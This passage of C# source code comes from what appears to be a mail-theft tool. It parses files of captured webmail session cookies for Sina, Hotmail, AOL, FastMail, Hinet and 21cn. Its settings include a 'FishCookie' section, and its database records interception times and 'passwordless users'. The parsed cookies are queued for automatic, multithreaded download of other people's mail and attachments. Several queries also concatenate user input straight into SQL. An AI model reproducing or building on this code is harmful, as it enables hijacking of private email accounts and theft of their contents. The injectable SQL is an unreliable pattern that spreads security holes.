                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "alter table users add 自动收取 yesno";
                    this.ExecuteSQL(strSql);
                }
                foreach (TreeNode node in this.treeViewUsers.Nodes)
                {
                    this.treeViewUsers.SelectedNode = node;
                }
                foreach (TreeNode node2 in this.treeViewUsers.Nodes[1].Nodes)
                {
                    this.treeViewUsers.SelectedNode = node2;
                }
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini"))
                {
                    this.saveFilePath = Setting.GetIniValue("CookieEmail", "File Path", "", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.TimeInterval = Setting.GetIniValue("CookieEmail", "Receive IntervalTime", "1  小时", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.MaxThreads = Convert.ToInt32(Setting.GetIniValue("CookieEmail", "Max Threads", "10", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini"));
                    this.SaveAttachment = Setting.GetIniValue("CookieEmail", "Save Attachment", "是", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini") == "是";
                    this.CookieUrl = Setting.GetIniValue("FishCookie", "CookieUrl", "http://", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.CookieTime = Setting.GetIniValue("FishCookie", "CookieTime", "10", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.CookieUserlist = Setting.GetIniValue("FishCookie", "CookieUserlist", "", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                   // this.SoudMsg = Setting.GetIniValue("CookieEmail", "MP3", AppDomain.CurrentDomain.BaseDirectory + @"\Soud\msg.mp3", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.PageNumber = Setting.GetIniValue("CookieEmail", "Page Number", "0", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.checkDataSave = "True" == Setting.GetIniValue("CookieEmail", "IsDataSave", "True", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    if (this.saveFilePath == "")
                    {
                        this.saveFilePath = AppDomain.CurrentDomain.BaseDirectory;
                    }
                    string str3 = Setting.GetIniValue("CookieEmail", "EmailDateTime", "无限制", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    if (str3.Trim() == "无限制")
                    {
                        this.EmailDateTime = DateTime.Now.AddYears(-50);
                    }
                    else if (str3.Trim().IndexOf(" ") != -1)
                    {
                        str3 = str3.Substring(0, str3.IndexOf(" "));
                        if (str3 != "")
                        {
                            GlobalValue.mainForm.EmailDateTime = DateTime.Now.AddMonths(Convert.ToInt32("-" + str3));
                        }
                        else
                        {
                            GlobalValue.mainForm.EmailDateTime = DateTime.Now.AddYears(-50);
                        }
                    }
                    else
                    {
                        GlobalValue.mainForm.EmailDateTime = Convert.ToDateTime(str3.Trim());
                    }
                }
                else
                {
                    Setting.SetIniValue("CookieEmail", "File Path", "", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("CookieEmail", "Receive IntervalTime", "1  小时", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("CookieEmail", "Max Threads", "10", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("CookieEmail", "Save Attachment", "是", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("CookieEmail", "EmailDateTime", "无限制", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("CookieEmail", "Page Number", "0", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("FishCookie", "CookieUrl", "http://", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("FishCookie", "CookieTime", "10", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    Setting.SetIniValue("FishCookie", "CookieUserlist", "", AppDomain.CurrentDomain.BaseDirectory + @"\cookieSetting.ini");
                    this.CookieUrl = "http://";
                    this.CookieTime = "10";
                    this.CookieUserlist = "";
                    this.saveFilePath = AppDomain.CurrentDomain.BaseDirectory;
                    this.TimeInterval = "1  小时";
                    this.MaxThreads = 10;
                    this.SaveAttachment = true;
                    this.EmailDateTime = DateTime.Now.AddYears(-50);
                }
                this.treeViewUsers.Nodes[0].Remove();
               /* this.YahooToolStripMenuItem.Visible = false;
                this.hinetToolStripMenuItem.Visible = false;
                this.HotmailToolStripMenuItem.Visible = false;
                this.tool163StripMenuItem163.Visible = false;
                this.toolStripMenuItem2.Visible = false;
                this.ruToolStripMenuItem.Visible = false;*/
                string str4 = this.TimeInterval.Substring(0, this.TimeInterval.IndexOf(" "));
                if (str4 != "")
                {
                    this.timerAutoReceive.Interval = 0x36ee80 * Convert.ToInt32(str4);
                }
                else
                {
                    this.timerAutoReceive.Interval = 0x36ee80 * Convert.ToInt32("1");
                }
            }

        }

        private void timerAutoReceive_Tick(object sender, EventArgs e)
        {
            string rowsNO = "";
            string str2 = "select * from users where 接收状态=false and 自动收取=true";
            this.oleDbCommand = new OleDbCommand();
            this.oleDbCommand.CommandText = str2;
            this.oleDbCommand.Connection = this.conn;
            OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
            while (reader.Read())
            {
                rowsNO = reader[0].ToString();
                if (!this.EnqueueUser(rowsNO))
                {
                    this.listBoxView.Items.Add("写入用户索引失败:");
                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                }
            }
            this.Threadusers = this.MaxThreads;

        }

        public void sinamail_txt(string sina_txtPath, bool Auto, string cookieRemarks)
        {
            string str = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str4 = "";
            StreamReader reader = new StreamReader(sina_txtPath, Encoding.Default);
            while ((str = reader.ReadLine()) != null)
            {
                if (str.Length > 0x19)
                {
                    index = str.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = str.IndexOf("URL");
                        if (num2 != -1)
                        {
                            s = str.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = str.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str4 = str.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                str = str.Substring(index + 8, str.Length - (index + 8)).Trim();
                            }
                        }
                    }
                    if (str.IndexOf("@sina.com") != -1)
                    {
                        str4 = "http://mail234-233.sinamail.sina.com.cn/classic/index.php?";
                    }
                    else if (str.IndexOf("@vip.sina.com") != -1)
                    {
                        str4 = "http://vip3-158.sinamail.sina.com.cn/classic/index.php ";
                    }
                    else
                    {
                        this.listBoxView.Items.Add("缺少必须的Cookie");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        continue;
                    }
                    if (str4 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "SINAMAIL";
                        cookieInfo.mailCookieUrl = str4;
                        cookieInfo.cookieTxx = str;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        public void hotmail_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string str2 = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8));
                            }
                        }
                    }
                    str2 = this.getHCookie(strCookie);
                    if (str2 == "")
                    {
                        this.listBoxView.Items.Add("转换失败!");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功!");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "HOTMAIL";
                        cookieInfo.mailCookieUrl = "mail.live.com";
                        cookieInfo.cookieTxx = str2;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private string getHCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, "RPSTAuth=", ";", 0);
            if (!(str != "-1"))
            {
                return str2;
            }
            if (str.EndsWith(";"))
            {
                return (str2 + " RPSTAuth=" + str);
            }
            return (str2 + " RPSTAuth=" + str + ";");
        }

        public void Aolmail_txt(string aol_txtPath, bool Auto, string cookieRemarks)
        {
            string str = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str4 = "";
            StreamReader reader = new StreamReader(aol_txtPath, Encoding.Default);
            while ((str = reader.ReadLine()) != null)
            {
                if (str.Length > 0x19)
                {
                    index = str.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = str.IndexOf("URL");
                        if (num2 != -1)
                        {
                            s = str.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = str.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str4 = str.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                str = str.Substring(index + 8, str.Length - (index + 8)).Trim();
                            }
                            if (str4 == "")
                            {
                                str4 = "http://webmail.aol.com/31509-111/aol-1/en-us/common/settings.js.aspx";
                            }
                        }
                    }
                    else
                    {
                        str4 = "http://webmail.aol.com/31509-111/aol-1/en-us/common/settings.js.aspx";
                    }
                    if (str4 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "AOLMAIL";
                        cookieInfo.mailCookieUrl = str4;
                        cookieInfo.cookieTxx = str;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        public void fastmail_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string str = "";
            string str2 = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str4 = "";
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((str = reader.ReadLine()) != null)
            {
                if (str.Length > 0x19)
                {
                    index = str.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = str.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = str.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = str.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str4 = str.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                if (str4.Length == 0)
                                {
                                    this.listBoxView.Items.Add("Url不正确请检查");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                    continue;
                                }
                                str = str.Substring(index + 8, str.Length - (index + 8));
                            }
                        }
                        else
                        {
                            this.listBoxView.Items.Add("Url不正确请检查");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                    }
                    if ((str4 != "") && (str4 != null))
                    {
                        str2 = str;
                        if (str2 == "")
                        {
                            this.listBoxView.Items.Add("转换失败！");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                        else
                        {
                            this.listBoxView.Items.Add("转换成功！");
                            CookieInfos cookieInfo = new CookieInfos();
                            cookieInfo.mailCookieType = "FastMail";
                            cookieInfo.mailCookieUrl = str4;
                            cookieInfo.cookieTxx = str2;
                            cookieInfo.nowTime = now.ToString();
                            cookieInfo.UserList = this.UserList;
                            cookieInfo.Auto = Auto;
                            cookieInfo.cookieRemarks = cookieRemarks;
                            try
                            {
                                if (!this.EnqueueCookie(cookieInfo))
                                {
                                    this.listBoxView.Items.Add("添加cookie失败:");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                }
                                continue;
                            }
                            catch
                            {
                                this.listBoxView.Items.Add("写入cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                continue;
                            }
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        public void hinet_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string str2 = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str4 = "";
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str4 = strCookie.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                if (str4.Length == 0)
                                {
                                    this.listBoxView.Items.Add("Url不正确请检查");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                    continue;
                                }
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8));
                            }
                        }
                        else
                        {
                            this.listBoxView.Items.Add("Url不正确请检查");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                    }
                    if ((str4 != "") && (str4 != null))
                    {
                        str2 = this.getHinetCookie(strCookie);
                        if (str2 == "")
                        {
                            this.listBoxView.Items.Add("转换失败！");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                        else
                        {
                            this.listBoxView.Items.Add("转换成功！");
                            CookieInfos cookieInfo = new CookieInfos();
                            cookieInfo.mailCookieType = "HINET";
                            cookieInfo.mailCookieUrl = str4;
                            cookieInfo.cookieTxx = str2;
                            cookieInfo.nowTime = now.ToString();
                            cookieInfo.UserList = this.UserList;
                            cookieInfo.Auto = Auto;
                            cookieInfo.cookieRemarks = cookieRemarks;
                            try
                            {
                                if (!this.EnqueueCookie(cookieInfo))
                                {
                                    this.listBoxView.Items.Add("添加cookie失败:");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                }
                                continue;
                            }
                            catch
                            {
                                this.listBoxView.Items.Add("写入cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                continue;
                            }
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        public void CNmail_txt(string sina_txtPath, bool Auto, string cookieRemarks)
        {
            string str = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str4 = "";
            StreamReader reader = new StreamReader(sina_txtPath, Encoding.Default);
            while ((str = reader.ReadLine()) != null)
            {
                if (str.Length > 0x19)
                {
                    index = str.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = str.IndexOf("URL");
                        if (num2 != -1)
                        {
                            s = str.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = str.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str4 = str.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                str = str.Substring(index + 8, str.Length - (index + 8)).Trim();
                            }
                            if (str4 == "")
                            {
                                if (str.IndexOf("21cn.com") != -1)
                                {
                                    str4 = "http://hermesw2.webmail.21cn.com/webmail/signOn.do";
                                }
                                else
                                {
                                    str4 = "http://hermesw2.webmail.21cn.net/webmail/signOn.do";
                                }
                            }
                        }
                    }
                    if (str4 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "21CNMAIL";
                        cookieInfo.mailCookieUrl = str4;
                        cookieInfo.cookieTxx = str;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private void forwardToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.GoForward();
        }

        private void backToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.GoBack();
        }

        private void stopToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.Stop();
        }

        private void refreshToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.Refresh();
        }

        private void homeToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.GoHome();
        }

        private void searchToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.GoSearch();
        }

        private void printToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.ShowPrintDialog();
        }

        private void printPreviewToolStripButton_Click(object sender, EventArgs e)
        {
            this.webBrowserView.ShowPrintPreviewDialog();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Navigate();
        }
        private void Navigate()
        {
            this.webBrowserView.Navigate(this.addressTextBox.Text);
        }

        private void treeViewUsers_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            if (e.Label != null)
            {
                if (e.Label.Trim().Length <= 0)
                {
                    e.CancelEdit = true;
                    goto Label_04B5;
                }
                if (e.Label.Trim().IndexOfAny(new char[] { '@', '.', ',', '!' }) == -1)
                {
                    if (e.Label.Trim() != this.userListLabel)
                    {
                        if (e.Node.Parent.Text == "未过滤用户")
                        {
                            string strSql = "select count(*) from UsersList where UsersListName='" + e.Label.Trim() + "'";
                            if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(strSql)) == 0)
                            {
                                try
                                {
                                    strSql = "update UsersList set UsersListName='" + e.Label.Trim() + "'where UsersListName='" + this.userListLabel + "'";
                                    if (this.ExecuteSQL(strSql).IndexOf("false") != -1)
                                    {
                                        MessageBox.Show("修改失败!请检查是否有特殊字符", "警告");
                                        e.CancelEdit = true;
                                        return;
                                    }
                                    strSql = "update users set 用户列表='" + e.Label.Trim() + "'where 用户列表='" + this.userListLabel + "'";
                                    this.ExecuteSQL(strSql);
                                    foreach (TreeNode node in this.treeViewUsers.Nodes[1].Nodes)
                                    {
                                        if (node.Text == this.userListLabel)
                                        {
                                            this.treeViewUsers.LabelEdit = true;
                                            node.BeginEdit();
                                            node.Text = e.Label.Trim();
                                            node.EndEdit(true);
                                            this.treeViewUsers.LabelEdit = false;
                                            this.treeViewUsers.SelectedNode = node;
                                        }
                                    }
                                    this.treeViewUsers.SelectedNode = e.Node;
                                    goto Label_04B5;
                                }
                                catch (Exception exception)
                                {
                                    this.listBoxView.Items.Add("treeViewUsers_AfterLabelEdit异常:" + exception.Message);
                                    e.CancelEdit = true;
                                    return;
                                }
                            }
                            MessageBox.Show("用户列表已存在！", "警告");
                            e.CancelEdit = true;
                        }
                        else if (e.Node.Parent.Text == "过滤后用户")
                        {
                            string str3 = "select count(*) from UsersList where UsersListName='" + e.Label.Trim() + "'";
                            if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str3)) == 0)
                            {
                                try
                                {
                                    str3 = "update UsersList set UsersListName='" + e.Label.Trim() + "'where UsersListName='" + this.userListLabel + "'";
                                    if (this.ExecuteSQL(str3).IndexOf("false") != -1)
                                    {
                                        MessageBox.Show("修改失败!请检查是否有特殊字符", "警告");
                                        e.CancelEdit = true;
                                        return;
                                    }
                                    str3 = "update users set 用户列表='" + e.Label.Trim() + "'where 用户列表='" + this.userListLabel + "'";
                                    this.ExecuteSQL(str3);
                                    foreach (TreeNode node2 in this.treeViewUsers.Nodes[0].Nodes)
                                    {
                                        if (node2.Text == this.userListLabel)
                                        {
                                            this.treeViewUsers.LabelEdit = true;
                                            node2.BeginEdit();
                                            node2.Text = e.Label.Trim();
                                            node2.EndEdit(true);
                                            this.treeViewUsers.LabelEdit = false;
                                            this.treeViewUsers.SelectedNode = node2;
                                        }
                                    }
                                    this.treeViewUsers.SelectedNode = e.Node;
                                    goto Label_04B5;
                                }
                                catch (Exception exception2)
                                {
                                    this.listBoxView.Items.Add("treeViewUsers_AfterLabelEdit异常:" + exception2.Message);
                                    e.CancelEdit = true;
                                    return;
                                }
                            }
                            MessageBox.Show("用户列表已存在！", "警告");
                            e.CancelEdit = true;
                        }
                    }
                    goto Label_04B5;
                }
                MessageBox.Show("无效的字符: '@','.', ',', '!'", "警告!");
                e.CancelEdit = true;
            }
            return;
        Label_04B5:
            this.treeViewUsers.LabelEdit = false;

        }

        private void treeViewUsers_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                switch (e.Node.Level)
                {
                    case 0:
                        this.AddUsersListNode(sender, e);
                        e.Node.Expand();
                        return;

                    case 1:
                        if (!(e.Node.Parent.Text == "未过滤用户"))
                        {
                            break;
                        }
                        this.tXX数据包ToolStripMenuItem_Click(sender, e);
                        return;

                    case 2:
                        this.showSingleUser(sender, e);
                        e.Node.SelectedImageIndex = 1;
                        return;

                    default:
                        goto Label_009A;
                }
                if (e.Node.Parent.Text == "过滤后用户")
                {
                    this.无密用户ToolStripMenuItem_Click(sender, e);
                }
                return;
            Label_009A:
                this.listBoxView.Items.Add("[用户列表:]  未处理" + DateTime.Now);
                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
            }
            catch (Exception exception)
            {
                this.listBoxView.Items.Add("treeViewUsers_AfterSelect异常:" + exception.Message);
            }

        }

        private void showSingleUser(object sender, TreeViewEventArgs e)
        {
            string name = e.Node.Name;
            string sqlShowUser = "SELECT * FROM users WHERE 序号=" + name;
            string sqlCountUsers = "select count(*) from users where 序号=" + name;
            this.UsersShow(sqlShowUser);
            this.UsersCount(sqlCountUsers);
        }

        private void 无密用户ToolStripMenuItem_Click(object sender, TreeViewEventArgs e)
        {
            string str = e.Node.Text.Trim();
            string sqlShowUser = "SELECT * FROM users WHERE 用户类型='无密用户' and 用户列表='" + str + "'";
            string sqlCountUsers = "select count(*) from users where 用户类型='无密用户' and 用户列表='" + str + "'";
            this.UsersShow(sqlShowUser);
            this.oleDbCommand = new OleDbCommand();
            this.oleDbCommand.CommandText = sqlShowUser;
            this.oleDbCommand.Connection = this.conn;
            OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
            e.Node.Nodes.Clear();
            while (reader.Read())
            {
                string str4 = reader[1].ToString();
                string str5 = reader[0].ToString();
                this.treeViewUsers.SelectedNode = e.Node;
                TreeNode node = new TreeNode();
                node.ImageIndex = 1;
                node.Text = str4;
                node.Name = str5;
                this.treeViewUsers.Invoke(new Add(this.AddNode), new object[] { node });
            }
            this.UsersCount(sqlCountUsers);
        }


        private void tXX数据包ToolStripMenuItem_Click(object sender, TreeViewEventArgs e)
        {
            string str = e.Node.Text.Trim();
            string sqlShowUser = "SELECT * FROM users WHERE 用户类型='TXX数据包' and 用户列表='" + str + "'";
            string sqlCountUsers = "select count(*) from users where 用户类型='TXX数据包' and 用户列表='" + str + "'";
            this.UsersShow(sqlShowUser);
            this.oleDbCommand = new OleDbCommand();
            this.oleDbCommand.CommandText = sqlShowUser;
            this.oleDbCommand.Connection = this.conn;
            OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
            e.Node.Nodes.Clear();
            while (reader.Read())
            {
                string str4 = reader[1].ToString();
                string str5 = reader[0].ToString();
                this.treeViewUsers.SelectedNode = e.Node;
                TreeNode node = new TreeNode();
                node.ImageIndex = 1;
                node.Text = str4;
                node.Name = str5;
                this.treeViewUsers.Invoke(new Add(this.AddNode), new object[] { node });
            }
            this.UsersCount(sqlCountUsers);
        }

        public void AddNode(TreeNode treeNode)
        {
            this.treeViewUsers.SelectedNode.Nodes.Add(treeNode);
        }

        private void AddUsersListNode(object sender, TreeViewEventArgs e)
        {
            string str = "select * from UsersList";
            this.oleDbCommand = new OleDbCommand();
            this.oleDbCommand.CommandText = str;
            this.oleDbCommand.Connection = this.oleDbConnection;
            OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
            if (e.Node.Nodes.Count == 0)
            {
                e.Node.Nodes.Clear();
                while (reader.Read())
                {
                    TreeNode node = new TreeNode();
                    node.Text = reader[1].ToString();
                    node.ImageIndex = 0;
                    e.Node.Nodes.Add(node);
                }
                reader.Close();
            }
            else
            {
                string sqlShowUser = "SELECT * FROM users";
                string sqlCountUsers = "select count(*) from users";
                this.UsersShow(sqlShowUser);
                this.UsersCount(sqlCountUsers);
            }
        }

        public void UsersShow(string sqlShowUser)
        {
            this.cookieMailData.Clear();
            this.cookieMailData.Tables["users"].Columns["序号"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["方向"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["服务器"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["口令字"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["端口"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["安全连接"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["接收时间"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["开始时间"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["时间段"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["时间间隔"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["时间限制"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["验证登陆"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["邮件地址"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["接收"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["密码类型"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["截取时间"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["源地址"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["目标地址"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["登陆信息"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["用户类型"].ColumnMapping = MappingType.Hidden;
            this.cookieMailData.Tables["users"].Columns["全部接收"].ColumnMapping = MappingType.Hidden;
          
            this.dataGridView.DataSource = this.cookieMailData;
            this.dataGridView.DataMember = "users";
            this.oleDbSelectCommand1.CommandText = sqlShowUser;
            this.oleDbDataAdapterView.Adapter.SelectCommand.CommandText = sqlShowUser;
            this.oleDbDataAdapterView.Fill(this.cookieMailData.users);
           
            for (int i = 0; i < this.dataGridView.Columns.Count; i++)
            {
